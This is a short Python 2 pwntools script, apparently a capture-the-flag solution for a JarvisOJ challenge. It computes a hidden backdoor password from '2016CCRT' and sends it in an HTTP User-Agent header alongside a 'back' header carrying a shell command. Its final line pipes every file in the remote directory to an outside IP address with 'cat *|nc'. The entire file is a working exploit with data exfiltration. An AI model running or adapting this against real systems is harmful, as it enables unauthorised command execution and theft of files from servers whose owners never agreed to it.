#!/usr/bin/env python

from pwn import *

context.log_level = 21


def get_password():
    counter = 0
    password = ""
    for i in "2016CCRT":
        password += chr(ord(i) ^ counter)
        counter += 1
    return password


def get_payload(command, password):
    payload = ""
    payload += "GET / HTTP/1.1\r\n"
    payload += "User-Agent: %s\r\n" % (password)
    payload += "back: %s\r\n" % (command)
    payload += "\r\n"
    payload += "\r\n"
    return payload


def send_payload(payload):
    Io = remote(HOST, PORT)
    Io.sendline(payload)
    result = Io.read()
    Io.close()
    return result


def execute(command):
    payload = get_payload(command, PASSWORD)
    print "[+] Payload : %s" % (repr(payload))
    return send_payload(payload)


PASSWORD = get_password()

#DEBUG = True
DEBUG = False

if DEBUG:
    HOST = "localhost"
    PORT = 1807
else:
    HOST = "pwn.jarvisoj.com"
    PORT = 9881

print execute("cat *|nc 115.159.88.26 2333")